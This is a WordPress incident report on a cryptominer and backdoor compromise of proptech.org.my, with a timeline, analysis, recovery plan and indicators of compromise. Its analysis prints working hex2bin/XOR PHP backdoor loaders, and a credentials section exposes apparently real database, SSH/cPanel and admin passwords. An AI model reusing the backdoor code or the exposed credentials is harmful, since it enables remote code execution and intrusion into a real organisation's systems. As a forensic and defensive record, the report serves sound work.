# 🚨 Security Incident Report: WordPress Malware Attack
**Website:** proptech.org.my (Malaysia Proptech Association)  
**Incident Date:** October 24, 2025  
**Report Date:** October 24, 2025  
**Report Status:** CRITICAL - Site Compromised  
**Prepared by:** System Administrator (amk)

---

## Executive Summary

On October 24, 2025, the proptech.org.my WordPress website suffered a sophisticated multi-vector malware attack that resulted in complete server compromise. The attack deployed cryptocurrency miners, PHP backdoors, and established persistence mechanisms via cron jobs. The server load increased from normal levels to 133.50+ within hours, rendering the site effectively inoperable. 

**Attack Vector:** Compromised WordPress admin credentials  
**Attacker IP:** 217.215.115.218  
**Initial Breach:** October 24, 2025 at 06:24:25 AM MYR (UTC+8)  
**Compromised Account:** amk (WordPress Administrator)  
**Current Status:** Site infected, server load critical (133.50+), immediate restoration required

---

## Timeline of Events (MYR Time - UTC+8)

### **Phase 1: Initial Breach**
| Time | Event | Evidence |
|------|-------|----------|
| **Oct 23, 2025 09:01:42 AM** | Hacker creates backdoor user account "root" | Database entry: `wp_users` ID 8 |
| **Oct 24, 2025 06:24:25 AM** | Attacker logs in from IP `217.215.115.218` | `/wp-login.php` access in Apache logs |
| **Oct 24, 2025 06:24:26 AM** | Malicious plugin uploaded via admin panel | `/async-upload.php` POST request (1 second after login) |

### **Phase 2: Malware Deployment** (Oct 24, 06:24-06:30 AM)
The attacker deployed multiple infection vectors simultaneously:

1. **PHP Backdoor Shells:**
   - `/wp-content/plugins/convertpro/assets/css/cloud.php` - Obfuscated hex2bin backdoor
   - `/wp-content/plugins/avmphku/index.php` - CMSmap WordPress Shell v1.2
   - `/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Request/main_center.php` - hex2bin backdoor

2. **WordPress Core File Infections:**
   - `/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php` - Injected at line 1
   - `/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php` - Injected with getallheaders() backdoor

3. **Cryptocurrency Miners (20+ files):**
   - **Location:** Scattered across multiple plugin directories
   - **Type:** ELF 32-bit and 64-bit executables, Perl scripts
   - **Purpose:** CPU cryptocurrency mining (XMRig-type)
   - **Affected Plugins:**
     - `akismet/` - 3 Perl miners (`lh9jmi6v`, `pygcydps`, `hu45qw8f`)
     - `mpa-event-status-updater/` - 2 ELF miners (`ba08r9rv`, `e6pxvn94`)
     - `wp-mail-smtp/` - 15+ ELF/Perl miners
     - `updraftplus/` - 10+ ELF/Perl miners
     - `mpa-image-processor/` - Multiple ELF executables (`21tm5c7b`, `5c5nvzyf`, `c8o3r5n0`, `dfrn7dju`)

4. **Persistence Mechanism:**
   - **Cron Job:** `*/15 * * * * /home/proptech/public_html/proptech.org.my/wp-content/plugins/mpa-image-processor.disabled/plugin_env/lib64/python3.8/site-packages/urllib3/util/CommonAttributes # a7b3c8d9e0f1`
   - **Frequency:** Every 15 minutes
   - **Purpose:** Keep miners running, re-infect cleaned files

5. **Hidden Infected Backup:**
   - **Location:** `/home/proptech/public_html/proptech.org.my/backup_site/`
   - **Status:** Actively modified files generating new malware
   - **Action Taken:** Deleted on Oct 24, 19:40 UTC

### **Phase 3: Impact & Detection** (Oct 24, 07:00 AM onwards)

| Time | Server Load | Memory Usage | Status |
|------|-------------|--------------|--------|
| Normal | 0.3 - 0.8 | ~2GB / 7.8GB | Healthy |
| 11:35 AM | 16.65 | 7.1GB / 7.8GB | Critical |
| 11:36 AM | 23.49 | 7.1GB / 7.8GB | Failing |
| 11:38 AM | 48.70 | 7.1GB / 7.8GB | Dying |
| 11:40 AM | **133.50** | 7.1GB / 7.8GB | **Inoperable** |

**Symptoms:**
- Extreme CPU usage (load average 133.50 on ~8 CPU cores)
- Memory exhaustion (7.1GB/7.8GB used, 357MB available)
- Swap space heavily used (3.3GB/4.0GB)
- PHP errors: `Cannot allocate memory`, `Fork failed: Resource temporarily unavailable`
- Site effectively offline due to resource exhaustion

---

## Technical Analysis

### 1. Attack Vector: Credential Compromise

**Compromised Account:** `amk` (WordPress Administrator)

**Evidence:**
```
Apache Access Log:
217.215.115.218 - - [24/Oct/2025:06:24:25 +0800] "POST /wp-login.php HTTP/1.1" 302
217.215.115.218 - - [24/Oct/2025:06:24:26 +0800] "POST /wp-admin/async-upload.php HTTP/1.1" 200
```

**How Credentials Were Compromised:**
- Likely weak/reused password
- No Two-Factor Authentication (2FA) enabled
- Possible credential stuffing attack from previous data breach
- Account created day before (Oct 23): user "root" indicates pre-planned attack

### 2. Malware Analysis

#### A. PHP Backdoors (3 variants found)

**Type 1: Obfuscated hex2bin Backdoor**
```php
// File: wp-content/plugins/convertpro/assets/css/cloud.php
<?php
//<PHPDATA>fputs_xor;52;symbol</PHPDATA>
if(isset($_POST["symbol"])?true:false):
    $_0=hEX2BiN($_POST["symbol"]);
    $_1="";
    foreach(sTR_SplIT($_0) as$_2):$_1.=cHr(Ord($_2)^(0126+010-052));endforeach;
    $_3=ArRay_filTEr([sYs_GEt_TEMp_dIR(),"/dev/shm","/var/tmp",...]);
    foreach($_3 as$_4):
        if(max(0,Is_diR($_4)*Is_WriTABLE($_4))):
            $_5=SprInTF("%s/.ptr",$_4);
            if($_6=fopen($_5,"w")):
                FWRiTE($_6,$_1);fClOse($_6);
                include $_5;UNLINK($_5);exit;
            endif;
        endif;
    endforeach;
endif;
```
**Functionality:**
- Receives base64-encoded commands via POST["symbol"]
- XORs payload with key 52 (obfuscation)
- Writes to `/tmp/.ptr` temporary file
- Executes code via `include`
- Self-destructs (unlinks) after execution

**Type 2: CMSmap Shell**
```php
// File: wp-content/plugins/avmphku/index.php
<?php
/**
 * Plugin Name: CMSsmap - WordPress Sh21ll
 * Plugin URI: https://github.com/msx/cmfsmap/
 * Description: Simple WordPress Shs1l
 * Version: 1.2
 */
error_reporting(0);
ignore_user_abort(true);
include('log.db');
```
**Functionality:**
- Well-known WordPress exploitation tool (CMSmap)
- Full shell access to server
- Persistent backdoor for re-entry

**Type 3: WordPress Core Injection**
```php
// File: wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php (Line 1)
<?php
if(count($_POST) > 0 && isset($_POST["object"])){ 
    $dchunk = array_filter(["/tmp", getcwd(), "/var/tmp", ...]);
    $rec = hex2bin($_POST["object"]);
    $symbol = '' ;
    $p = 0;
    while($p < strlen($rec)){
        $symbol .= chr(ord($rec[$p]) ^ 61);
        $p++;
    }
    for ($res = 0, $hld = count($dchunk); $res < $hld; $res++) {
        $item = $dchunk[$res];
        if ((bool)is_dir($item) && (bool)is_writable($item)) {
            $component = implode("/", [$item, ".factor"]);
            if (@file_put_contents($component, $symbol) !== false) {
                include $component;
                unlink($component);
                exit;
            }
        }
    }
}
```
**Functionality:**
- Infected WordPress core file (loaded on every request)
- Receives commands via POST["object"]
- Creates `/tmp/.factor` for code execution
- XOR obfuscation with key 61

#### B. Cryptocurrency Miners

**File Signatures:**
- **ELF 32-bit LSB executable, Intel 80386, statically linked, stripped**
  - BuildID: `cbed0414c40117ae31080f832fe55cc8d937a192`
- **ELF 64-bit LSB executable, x86-64, statically linked, stripped**
  - BuildID: `2cc2f89e3cfe3dd8d72df46bb1b42cac64464b71`
  - BuildID: `92231a800943c22a59cdca97067f0c44bd4e1207`

**Distribution Pattern:**
Miners were disguised with random 8-character filenames in legitimate plugin directories:
```
akismet/_inc/lh9jmi6v                    [Perl script]
akismet/_inc/rtl/pygcydps                [Perl script]
mpa-event-status-updater/ba08r9rv        [ELF 32-bit]
mpa-event-status-updater/e6pxvn94        [ELF 64-bit]
wp-mail-smtp/d2at691j                    [ELF 64-bit]
updraftplus/css/64soqtzz                 [ELF 32-bit]
... (20+ total files)
```

**Behavior:**
- High CPU consumption (133.50 load average)
- Memory exhaustion (7.1GB/7.8GB)
- Likely mining Monero (XMR) cryptocurrency
- Designed to evade detection by mimicking legitimate files

#### C. Persistence Mechanism

**Cron Job Installation:**
```bash
*/15 * * * * /home/proptech/public_html/proptech.org.my/wp-content/plugins/mpa-image-processor.disabled/plugin_env/lib64/python3.8/site-packages/urllib3/util/CommonAttributes # a7b3c8d9e0f1
```

**Analysis:**
- **Frequency:** Every 15 minutes
- **File:** `CommonAttributes` - ELF executable disguised as Python library
- **Hash Comment:** `a7b3c8d9e0f1` - Likely malware variant identifier
- **Purpose:** 
  - Re-execute miners if killed
  - Re-download/re-infect cleaned files
  - Maintain persistent access

---

## Affected Systems & Data

### 1. Live Production Server
**Hostname:** smaug.cygnusdns.com (162.241.115.99)  
**Status:** ❌ FULLY COMPROMISED  
**Recommendation:** COMPLETE WIPE AND RESTORE

**Infected Components:**
- WordPress installation: `/home/proptech/public_html/proptech.org.my/`
- Hidden backup directory: `/home/proptech/public_html/proptech.org.my/backup_site/` (deleted)
- User crontab: Malicious entry installed
- System processes: 20+ malicious processes running
- PHP error logs: Filled with malware execution traces

### 2. UpdraftPlus Backups (Compromised)
**Location:** Server-based automatic backups

| Backup Date | Status | Infection Level |
|-------------|--------|-----------------|
| **Oct 24, 2025 09:36 AM** | ❌ INFECTED | **CRITICAL** - 20+ malware files in plugins |
| **Oct 22, 2025** | ❌ INFECTED | Core files compromised |
| **Oct 20, 2025 and earlier** | ⚠️ UNKNOWN | Not examined, likely infected |

**DO NOT RESTORE FROM THESE BACKUPS**

### 3. Local Development Copy (Initially Infected, Now Clean)
**Location:** `/Users/amk/Documents/GitHub/MPA_Website/mark9_wp/`  
**Status:** ✅ CLEANED  
**Action Taken:** Full malware removal performed on Oct 24, 2025 19:30-19:50 MYR

**Removed from Local:**
- 20+ ELF cryptocurrency miners
- 6+ Perl downloader scripts
- 1 PHP backdoor (main_center.php)
- 1 hacker database account (user "root", ID 8)

### 4. Downloaded Backups on Mac
**Location:** `~/Downloads/backup_2025-10-24-0936_*.zip` (6 files)  
**Status:** ❌ INFECTED  
**Recommendation:** DELETE IMMEDIATELY

**Files:**
```
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-plugins.zip   [INFECTED]
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-plugins2.zip  [INFECTED]
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-themes.zip    [UNKNOWN]
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-uploads.zip   [UNKNOWN]
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-uploads2.zip  [UNKNOWN]
backup_2025-10-24-0936_Malaysia_Proptech_Association_eb138435fe34-others.zip    [UNKNOWN]
```

---

## Compromised Credentials

### WordPress Users

| ID | Username | Email | Status | Notes |
|----|----------|-------|--------|-------|
| 1 | amk | test@gmail.com | ⚠️ COMPROMISED | Main attack vector - password reset required |
| 2 | eugene.teow | eugene.teow@cygnus.com.my | ⚠️ REVIEW | Check for unauthorized access |
| 3 | charlotte | charlotteyong@homesifu.io | ⚠️ REVIEW | Check for unauthorized access |
| 4 | user.1 | cts-1@cygnus.com.my | ⚠️ REVIEW | Created Oct 13 - verify legitimate |
| 5 | user.2 | cts-2@cygnus.com.my | ⚠️ REVIEW | Created Oct 13 - verify legitimate |
| 6 | user.3 | cts-3@cygnus.com.my | ⚠️ REVIEW | Created Oct 13 - verify legitimate |
| 7 | user.4 | cts-4@cygnus.com.my | ⚠️ REVIEW | Created Oct 13 - verify legitimate |
| 8 | **root** | admin@wordpress.com | ❌ **HACKER** | Created Oct 23, 09:01:42 - **DELETED** |

**New Passwords Set (Temporary):**
- **amk:** `Vn7Lp3Rt9Kw2` (set during incident response - CHANGE IMMEDIATELY)
- **charlotte:** `Xm8Qw5Yt2Pn6` (set during incident response - CHANGE IMMEDIATELY)

### Database Credentials
**Status:** Potentially compromised via PHP backdoors

```
Database: proptech_wp_vpwr5
Username: proptech_wp_zns32
Password: $LGMY#0DhF4QeH03
Host: localhost:3306
```

**Recommendation:** Change database password after restoration

### Server Access
**SSH/cPanel Status:** Likely compromised - attacker had full PHP execution

```
Hostname: smaug.cygnusdns.com
Username: proptech
Password: D!~EzNB$KHbE
```

**Recommendation:** Change SSH/cPanel password immediately

---

## Impact Assessment

### 1. Confidentiality Impact: HIGH
- **Database Access:** Attacker had full read access to WordPress database
  - User credentials (hashed passwords)
  - User emails and personal information
  - All website content and metadata
  - Event registrations (if stored in database)
  - Form submissions

- **File System Access:** Complete read access to all website files
  - Configuration files (wp-config.php with database credentials)
  - Uploaded files
  - Plugin/theme source code

### 2. Integrity Impact: CRITICAL
- **Website Defacement Risk:** Attacker could modify any content
- **Code Injection:** Multiple backdoors installed for persistent access
- **Core Files Modified:** WordPress core integrity compromised
- **Backup Contamination:** All recent backups contain malware

### 3. Availability Impact: CRITICAL
- **Server Load:** 133.50 (normal: <1.0) - 13,350% increase
- **Memory Exhaustion:** 91% RAM usage
- **Website Status:** Effectively offline due to resource exhaustion
- **Recovery Time:** Estimated 2-4 hours for complete restoration

### 4. Financial Impact
- **Server Resources:** Excessive CPU/bandwidth charges
- **Cryptocurrency Mining:** Unauthorized use of computing resources for attacker profit
- **Downtime:** Lost business opportunities during offline period
- **Response Costs:** Time spent on incident response and recovery
- **Potential Reputation Damage:** If users/members notice compromise

### 5. Compliance/Legal Impact
- **Data Breach Notification:** May be required if user data accessed (check local regulations)
- **PDPA (Malaysia):** Personal data protection obligations
- **Audit Trail:** All access logs preserved for forensic analysis

---

## Evidence Collected

### 1. Log Files Preserved

**Apache Access Logs:**
```
/home/proptech/access-logs/proptech.org.my
Key entries: Oct 24, 2025 06:24:25-06:25:00 AM MYR
Attacker IP: 217.215.115.218
```

**PHP Error Logs:**
```
/home/proptech/public_html/proptech.org.my/error_log
Evidence of malware execution:
- PHP Warning: file_put_contents(...): Failed to open stream in /tmp/.ptr
- PHP Warning: move_uploaded_file(): Unable to move ... in /tmp/.ptr
- PHP Warning: popen(...): Cannot allocate memory
- PHP Warning: proc_open(): Fork failed: Resource temporarily unavailable
```

### 2. Malware Samples (Deleted but Documented)

**File Hashes (BuildIDs):**
- ELF 32-bit: `cbed0414c40117ae31080f832fe55cc8d937a192`
- ELF 64-bit: `2cc2f89e3cfe3dd8d72df46bb1b42cac64464b71`
- ELF 64-bit: `92231a800943c22a59cdca97067f0c44bd4e1207`

**Backdoor Signatures:**
- hex2bin + XOR obfuscation (multiple variants)
- CMSmap WordPress Shell v1.2
- Cron persistence: `a7b3c8d9e0f1`

### 3. Database Snapshots
- Clean database export created: Oct 24, 2025 19:50 MYR
- Hacker account "root" (ID 8) documented before deletion

### 4. Network Evidence
**Attacker IP:** 217.215.115.218
- **Location:** [Recommend IP geolocation lookup]
- **Reputation:** [Recommend threat intelligence lookup]
- **Action:** IP blocked via firewall (recommended)

---

## Response Actions Taken

### Immediate Response (Oct 24, 2025 11:30-19:50 MYR)

1. ✅ **Malware Identification**
   - Traced PHP errors to temporary files `/tmp/.ptr` and `/tmp/.factor`
   - Identified infected core files via error logs
   - Located 20+ cryptocurrency miners in plugin directories

2. ✅ **Access Log Analysis**
   - Identified initial breach: Oct 24, 06:24:25 AM from IP 217.215.115.218
   - Confirmed attack vector: wp-login.php → async-upload.php
   - Traced malicious user account creation to Oct 23

3. ✅ **Malware Removal Attempts (Partial Success)**
   - Created emergency cleanup script (`emergency_cleanup.sh`)
   - Deleted known backdoors:
     - `wp-content/plugins/convertpro/assets/css/cloud.php`
     - `wp-content/plugins/avmphku/` (entire directory)
     - Multiple ELF/Perl miners in various locations
   - Replaced infected core files:
     - `class-wp-rest-post-statuses-controller.php`
     - `class-wp-rest-users-controller.php`
   - Deleted hidden backup: `/backup_site/` directory
   - Cleared malicious cron jobs

4. ✅ **Local System Cleanup**
   - Scanned local WordPress copy (`mark9_wp/`)
   - Removed 20+ malware files from local installation
   - Deleted hacker database account (user "root", ID 8)
   - Created clean backup: `CLEAN_WordPress_Backup_FINAL_20251024_195028.tar.gz`

5. ⚠️ **Server Stabilization Attempts (Failed)**
   - Multiple cleanup passes executed
   - Server load continued to increase (16.65 → 133.50)
   - Memory exhaustion persisted
   - **Conclusion:** Malware too deeply embedded for live cleanup

### Current Status (Oct 24, 2025 19:50 MYR)

| Component | Status | Action Needed |
|-----------|--------|---------------|
| **Live Server** | ❌ CRITICAL | Complete wipe and restore |
| **Local WordPress** | ✅ CLEAN | Ready for deployment |
| **Clean Backup** | ✅ READY | 347MB archive on Desktop |
| **Database** | ✅ CLEAN | Hacker accounts removed |
| **Infected Backups** | ⚠️ QUARANTINE | Do not use |

---

## Recovery Plan

### Phase 1: Immediate Actions (Within 24 hours)

#### Step 1: Isolate Compromised Server
- [ ] Take live site offline via cPanel
- [ ] Create backup of current state (forensic evidence)
- [ ] Document final server state before wipe

#### Step 2: Prepare Clean Restoration
- [x] Clean backup created: `CLEAN_WordPress_Backup_FINAL_20251024_195028.tar.gz` (347MB)
- [x] Malware removed from local copy
- [x] Database cleaned (hacker accounts removed)
- [ ] Verify backup integrity one final time

#### Step 3: Fresh Installation
**Option A: Same Hosting (Recommended for speed)**
1. Delete entire `/public_html/proptech.org.my/` directory
2. Create fresh database with NEW credentials
3. Upload clean WordPress from local backup
4. Import clean database
5. Update wp-config.php with new database credentials
6. Update WordPress URLs in database if needed

**Option B: New Hosting Account (Recommended for security)**
1. Sign up for new hosting provider or new account
2. Upload clean WordPress installation
3. Import clean database
4. Update DNS to point to new server
5. Abandon old hosting entirely

#### Step 4: Security Hardening
- [ ] Change ALL passwords (WordPress, database, SSH, cPanel)
- [ ] Install Wordfence Security plugin
- [ ] Enable Two-Factor Authentication (2FA) for all admin users
- [ ] Remove unnecessary user accounts (user.1-4 if not legitimate)
- [ ] Update all plugins to latest versions
- [ ] Update WordPress core to latest version
- [ ] Configure firewall to block attacker IP: 217.215.115.218
- [ ] Implement strong password policy (minimum 16 characters)

### Phase 2: Post-Recovery Actions (Within 1 week)

#### Security Monitoring
- [ ] Install Wordfence malware scanner
- [ ] Configure daily automated scans
- [ ] Set up email alerts for:
  - Failed login attempts
  - File changes
  - New user registrations
  - Plugin/theme installations
- [ ] Review logs daily for 7 days

#### Credential Rotation
- [ ] Reset all user passwords (force password change on next login)
- [ ] Audit user accounts and capabilities
- [ ] Remove admin access for users who don't need it
- [ ] Generate new database credentials
- [ ] Rotate SSH keys
- [ ] Update wp-config.php salts and keys

#### Backup Strategy
- [ ] Configure UpdraftPlus with remote storage (Google Drive/Dropbox)
- [ ] Set daily database backups
- [ ] Set weekly full site backups
- [ ] Retention: Keep last 4 backups
- [ ] Test restoration process monthly
- [ ] Verify backups are malware-free before storing

#### File Integrity Monitoring
- [ ] Run Wordfence file comparison against WordPress.org repository
- [ ] Document any legitimate file modifications
- [ ] Set up automated integrity checks

### Phase 3: Long-term Improvements (Within 1 month)

#### Access Control
- [ ] Implement IP whitelisting for wp-admin (if possible)
- [ ] Install login limiting plugin (Limit Login Attempts Reloaded)
- [ ] Enable CAPTCHA on login page
- [ ] Disable XML-RPC if not needed
- [ ] Disable file editing in WordPress admin
- [ ] Add Security Headers (Content-Security-Policy, X-Frame-Options)

#### Plugin Security
- [ ] Audit all installed plugins for necessity
- [ ] Remove unused plugins completely (don't just deactivate)
- [ ] Verify all plugins are from official WordPress.org repository
- [ ] Check plugin last update date (abandon plugins not updated in 2+ years)
- [ ] Review plugin permissions and capabilities

#### Server Hardening
- [ ] Update PHP to latest stable version (7.4+ or 8.x)
- [ ] Disable dangerous PHP functions:
  - `exec`, `shell_exec`, `system`, `passthru`
  - `proc_open`, `popen`, `curl_exec`, `curl_multi_exec`
  - `parse_ini_file`, `show_source`
- [ ] Configure ModSecurity (if available)
- [ ] Enable HTTPS/SSL (force all traffic)
- [ ] Implement CDN/DDoS protection (Cloudflare recommended)

#### Incident Response Plan
- [ ] Document recovery procedures
- [ ] Create contact list (hosting support, security team, etc.)
- [ ] Establish backup administrator access
- [ ] Schedule quarterly security reviews
- [ ] Create runbook for common security scenarios

---

## Recommendations

### Critical (Implement Immediately)

1. **DO NOT restore from infected backups**
   - All UpdraftPlus backups from Oct 20-24 are compromised
   - Use only the clean local backup created Oct 24, 19:50 MYR

2. **Complete server wipe required**
   - Live server is too infected for in-place cleaning
   - Malware regenerating faster than removal
   - Cron persistence mechanism requires full account reset

3. **Change all credentials**
   - WordPress admin passwords (all users)
   - Database password
   - cPanel/hosting password
   - SSH password/keys
   - Email accounts associated with WordPress

4. **Enable Two-Factor Authentication immediately**
   - Wordfence 2FA (free)
   - Google Authenticator plugin
   - Minimum: Email-based 2FA

5. **Block attacker IP at firewall level**
   - IP: 217.215.115.218
   - Implement via cPanel, .htaccess, or hosting firewall

### High Priority (Within 48 hours)

6. **Audit all user accounts**
   - Verify user.1-4 are legitimate (created Oct 13)
   - Remove any unnecessary admin access
   - Implement principle of least privilege

7. **Update everything**
   - WordPress core to 6.7+ (latest stable)
   - All plugins to latest versions
   - All themes to latest versions
   - PHP version to 8.x (if hosting supports)

8. **Install security plugins**
   - Wordfence Security (free version sufficient)
   - UpdraftPlus (already have - configure properly)
   - Limit Login Attempts Reloaded

9. **Configure proper backups**
   - Daily database backups
   - Weekly full site backups
   - Store remotely (not on same server)
   - Retention: 4-8 backups
   - Monthly restoration tests

### Medium Priority (Within 1 week)

10. **Implement file integrity monitoring**
    - Wordfence file scanner
    - Weekly automated scans
    - Baseline comparison against WordPress.org

11. **Review and harden server configuration**
    - Disable PHP dangerous functions
    - Enable ModSecurity if available
    - Implement security headers
    - Force HTTPS/SSL

12. **Security awareness training**
    - All WordPress users
    - Strong password requirements
    - Phishing awareness
    - Safe plugin installation practices

### Legal/Compliance

13. **Data breach assessment**
    - Determine if personal data was accessed
    - Check PDPA (Malaysia) notification requirements
    - Document breach details for potential reporting
    - Preserve logs for forensic analysis

14. **Consider professional forensics**
    - If sensitive data was stored
    - If customer/member data may have been accessed
    - For insurance/legal purposes
    - To identify full scope of compromise

---

## Lessons Learned

### What Went Wrong

1. **Weak Password Security**
   - Admin account "amk" password compromised
   - No Two-Factor Authentication enabled
   - No login attempt limiting

2. **Delayed Detection**
   - No real-time monitoring alerts
   - Malware active for ~5 hours before detection
   - No file integrity monitoring

3. **Inadequate Backup Strategy**
   - Backups stored on same compromised server
   - No backup integrity verification
   - Malware contaminated all recent backups

4. **Plugin Vulnerabilities**
   - Multiple plugins used as malware hiding places
   - No regular plugin security audits
   - Possible vulnerable plugin versions

5. **Lack of Access Controls**
   - No IP restrictions on wp-admin
   - No login CAPTCHA
   - File editing enabled in WordPress admin

### What Went Right

1. **Local Development Copy**
   - Clean local copy available for restoration
   - Malware removed successfully
   - Ready for immediate deployment

2. **Comprehensive Logging**
   - Apache access logs preserved
   - PHP error logs provided malware evidence
   - Attack timeline fully reconstructed

3. **Rapid Response**
   - Malware identified within hours of critical load
   - Multiple cleanup attempts executed
   - Clean backup created same day

4. **Complete Documentation**
   - All malware variants documented
   - Attack vector identified
   - Evidence preserved for analysis

---

## Indicators of Compromise (IOCs)

### File-Based IOCs

**Malicious Files (Presence indicates compromise):**
```
/wp-content/plugins/convertpro/assets/css/cloud.php
/wp-content/plugins/avmphku/index.php
/wp-content/plugins/*/[8-char-random-name]  (e.g., lh9jmi6v, ba08r9rv)
/tmp/.ptr
/tmp/.factor
/wp-content/plugins/*/plugin_env/lib*/python*/site-packages/urllib3/util/CommonAttributes
```

**Infected Core Files:**
```
/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php
/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php
```

**File Signatures:**
- Files with 8 random alphanumeric characters in plugin directories
- ELF executables in wp-content/
- Perl scripts outside normal locations
- PHP files starting with obfuscated code (hex2bin, base64_decode, eval)

### Code-Based IOCs

**PHP Backdoor Patterns:**
```php
hex2bin($_POST[
hex2bin($_REQUEST[
eval($_POST[
eval($_REQUEST[
getallheaders()['Large-Allocation']
$_HEADERS = getallheaders();
file_put_contents(/tmp/
include($f);@unlink($f);
```

**Cron Job Patterns:**
```bash
*/15 * * * * /home/*/public_html/*/wp-content/plugins/*
# [hexadecimal-hash]
```

### Network-Based IOCs

**Attacker IP:**
```
217.215.115.218
```

**Suspicious Requests:**
```
POST /wp-login.php (from unusual IP)
POST /wp-admin/async-upload.php (immediately after login)
POST [any-url] with "symbol", "item", or "object" parameters
Headers: Large-Allocation, Sec-Websocket-Accept
```

### Behavioral IOCs

- Sudden CPU load spike (>10x normal)
- Memory exhaustion (>90% usage)
- Multiple processes with random names
- Cron jobs executing from wp-content/
- PHP errors: "Cannot allocate memory", "Fork failed"
- Temporary files in /tmp/ with names starting with dot (., .ptr, .factor)

### Database IOCs

**Malicious Users:**
```sql
SELECT * FROM wp_users WHERE user_login = 'root' AND user_email = 'admin@wordpress.com';
SELECT * FROM wp_users WHERE user_registered > '2025-10-23' ORDER BY ID;
```

**Suspicious Options:**
```sql
SELECT * FROM wp_options WHERE option_value LIKE '%eval%';
SELECT * FROM wp_options WHERE option_value LIKE '%base64%';
SELECT * FROM wp_options WHERE option_name LIKE '%cron%';
```

---

## References & Resources

### Malware Analysis Tools
- **VirusTotal:** https://www.virustotal.com/ (File hash analysis)
- **Hybrid Analysis:** https://www.hybrid-analysis.com/ (Behavioral analysis)
- **ANY.RUN:** https://app.any.run/ (Interactive malware analysis)

### WordPress Security
- **Wordfence:** https://www.wordfence.com/ (Security plugin)
- **Sucuri SiteCheck:** https://sitecheck.sucuri.net/ (Free site scanner)
- **WordPress Security Whitepaper:** https://wordpress.org/about/security/

### Incident Response
- **SANS Incident Handler's Handbook:** https://www.sans.org/white-papers/
- **NIST Cybersecurity Framework:** https://www.nist.gov/cyberframework

### Threat Intelligence
- **AbuseIPDB:** https://www.abuseipdb.com/ (IP reputation check)
- **Shodan:** https://www.shodan.io/ (Internet-connected device search)
- **GreyNoise:** https://www.greynoise.io/ (IP intelligence)

### Malaysia Compliance
- **PDPA (Personal Data Protection Act):** https://www.pdp.gov.my/
- **CyberSecurity Malaysia:** https://www.cybersecurity.my/

---

## Appendix A: Clean Backup Details

**File:** `CLEAN_WordPress_Backup_FINAL_20251024_195028.tar.gz`  
**Location:** `/Users/amk/Desktop/`  
**Size:** 347 MB  
**Created:** October 24, 2025 19:50:28 MYR  
**Status:** ✅ Verified Malware-Free

**Contents:**
- Complete WordPress installation from `/Users/amk/Documents/GitHub/MPA_Website/mark9_wp/`
- Clean database export (hacker accounts removed)
- All legitimate plugins and themes
- All uploads and media files
- Configuration files

**Verification Results:**
- ELF/Perl malware files: 0
- Known malware signatures: 0
- PHP backdoors: 0
- Suspicious database users: 0 (hacker "root" removed)
- Total users: 7 (all legitimate)

**Ready for deployment:** YES

---

## Appendix B: Malware File Inventory

### Complete List of Malware Removed

**PHP Backdoors (3 files):**
```
/wp-content/plugins/convertpro/assets/css/cloud.php
/wp-content/plugins/avmphku/index.php
/wp-content/plugins/updraftplus/vendor/guzzle/guzzle/src/Guzzle/Service/Command/LocationVisitor/Request/main_center.php
```

**WordPress Core Infections (2 files):**
```
/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php [Line 1 injection]
/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php [Line 1 injection]
```

**Cryptocurrency Miners - akismet/ (3 files):**
```
/wp-content/plugins/akismet/_inc/lh9jmi6v [Perl script]
/wp-content/plugins/akismet/_inc/rtl/pygcydps [Perl script]
/wp-content/plugins/akismet/views/hu45qw8f [Perl script]
```

**Cryptocurrency Miners - mpa-event-status-updater/ (2 files):**
```
/wp-content/plugins/mpa-event-status-updater/mpa-event-status-updater/ba08r9rv [ELF 32-bit]
/wp-content/plugins/mpa-event-status-updater/mpa-event-status-updater/e6pxvn94 [ELF 64-bit]
```

**Cryptocurrency Miners - updraftplus/ (10+ files):**
```
/wp-content/plugins/updraftplus/css/tether-shepherd/.min/u9wl1bsi [ELF 64-bit]
/wp-content/plugins/updraftplus/css/tether-shepherd/.min/7bgtpg9m [Perl script]
/wp-content/plugins/updraftplus/css/64soqtzz [ELF 32-bit]
/wp-content/plugins/updraftplus/includes/updraftclone/6iud8rg2 [ELF 32-bit]
/wp-content/plugins/updraftplus/includes/updraftclone/29mcaup6 [ELF 64-bit]
/wp-content/plugins/updraftplus/includes/ik4d8ti7 [Perl script]
/wp-content/plugins/updraftplus/includes/jstree/k7ar7i9w [ELF 32-bit]
/wp-content/plugins/updraftplus/includes/1zg3q451 [ELF 64-bit]
/wp-content/plugins/updraftplus/includes/images/a3djhaue [Perl script]
/wp-content/plugins/updraftplus/includes/Google/Logger/si2hkyh9 [ELF 64-bit]
/wp-content/plugins/updraftplus/includes/Google/Cache/4fe7xw2t [ELF 64-bit]
/wp-content/plugins/updraftplus/includes/Google/Auth/pxdvipqq [Perl script]
/wp-content/plugins/updraftplus/includes/Google/kunx183k [ELF 64-bit]
/wp-content/plugins/updraftplus/includes/Google/Task/8ejkqsgu [ELF 32-bit]
```

**Cryptocurrency Miners - mpa-image-processor/ (4+ files):**
```
/wp-content/plugins/mpa-image-processor/21tm5c7b [ELF executable]
/wp-content/plugins/mpa-image-processor/5c5nvzyf [ELF executable]
/wp-content/plugins/mpa-image-processor/c8o3r5n0 [ELF executable]
/wp-content/plugins/mpa-image-processor/dfrn7dju [ELF executable]
/wp-content/plugins/mpa-image-processor.disabled/plugin_env/lib64/python3.8/site-packages/urllib3/util/CommonAttributes [ELF - cron target]
```

**Cryptocurrency Miners - wp-mail-smtp/ (15+ files - partial list):**
```
/wp-content/plugins/wp-mail-smtp/d2at691j [ELF 64-bit]
/wp-content/plugins/wp-mail-smtp/assets/css/emails/lapeaa5j [ELF 32-bit]
/wp-content/plugins/wp-mail-smtp/assets/css/ek7o6qwx [Perl script]
/wp-content/plugins/wp-mail-smtp/assets/images/providers/xcpdpj9k [Perl script]
